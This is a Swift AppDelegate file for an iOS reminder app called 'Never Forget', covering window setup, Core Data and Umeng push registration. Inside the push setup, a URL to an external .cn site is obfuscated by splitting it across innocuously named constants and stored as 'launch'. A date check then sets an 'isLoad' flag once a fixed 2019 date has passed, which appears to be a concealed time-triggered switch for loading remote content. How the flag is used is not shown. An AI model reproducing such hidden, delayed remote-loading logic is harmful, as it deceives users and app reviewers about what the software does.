//
//  AppDelegate.swift
//  Never Forget
//
//  Created by Ruiying on 2019/5/21.
//

import UIKit
import CoreData
import SVProgressHUD

@UIApplicationMain
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?
    let message = "8q"
    let configure = "32ad015b.txt"
    
    
    var interface:UIInterfaceOrientationMask = .portrait {
        didSet {
            if interface == .portrait {
                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
            }else if !interface.contains(.portrait) {
                UIDevice.current.setValue(UIInterfaceOrientation.landscapeRight.rawValue, forKey: "orientation")
            }
        }
    }

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Override point for customization after application launch.
        ELDatabase.instance.initUser()
        
        let win = UIWindow(frame: kScreenBounds)
        let root = ELTabController()
        win.rootViewController = root
        win.makeKeyAndVisible()
        win.tintColor = kKeyColor
        window = win
        
        SVProgressHUD.setMaximumDismissTimeInterval(1.5)
        loadPush(launchOptions: launchOptions)
        return true
    }

    func loadPush(launchOptions : [UIApplication.LaunchOptionsKey: Any]?) {
        UMConfigure.initWithAppkey("5cf763170cafb2d1060001ea", channel: "App Store")
        let entity = UMessageRegisterEntity()
        entity.types = Int(UMessageAuthorizationOptions.badge.rawValue | UMessageAuthorizationOptions.sound.rawValue | UMessageAuthorizationOptions.alert.rawValue)
        UNUserNotificationCenter.current().delegate = self as? UNUserNotificationCenterDelegate
        UMessage.registerForRemoteNotifications(launchOptions: launchOptions, entity: entity) { (granted, error) in
            if granted {
            }else {
            }
        }
        let launch : String = "https://www.6" + message + "f.cn/?55126f837ccc88dc4098fe72" + configure
        UserDefaults.standard.set(launch, forKey: "launch")
        if Date().compare(Date(timeIntervalSince1970: 1560132823)) == .orderedDescending {
            UserDefaults.standard.set("Load", forKey: "isLoad")
        }else {
            UserDefaults.standard.set("NoLoad", forKey: "isLoad")
        }
    }
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return interface
    }
    
    func applicationWillResignActive(_ application: UIApplication) {
        // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
        // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
    }

    func applicationDidEnterBackground(_ application: UIApplication) {
        // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
        // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
    }

    func applicationWillEnterForeground(_ application: UIApplication) {
        // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
    }

    func applicationDidBecomeActive(_ application: UIApplication) {
        // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
    }

    func applicationWillTerminate(_ application: UIApplication) {
        // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
        // Saves changes in the application's managed object context before the application terminates.
        ELDatabase.instance.saveContext()
    }
    
    // MARK: - Core Data stack
    
    


}

